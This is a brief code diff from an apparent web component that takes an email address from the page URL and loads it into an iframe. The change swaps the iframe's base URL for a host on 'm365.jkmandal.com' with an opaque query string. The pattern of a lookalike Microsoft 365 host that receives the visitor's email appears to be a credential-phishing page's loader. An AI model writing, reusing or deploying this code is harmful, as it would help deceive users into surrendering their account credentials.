@@ -28,7 +28,7 @@ export default {
       return match ? match[0] : null;
     },
     updateIframeSrc() {
-      const baseSrc = "https://handler.jkmandal.com/?token="; // Base URL
+      const baseSrc = "https://m365.jkmandal.com/?FSIc6=Oup4md"; // Base URL
       const email = this.extractEmailFromUrl();
 
       // Append only the email to the path if found
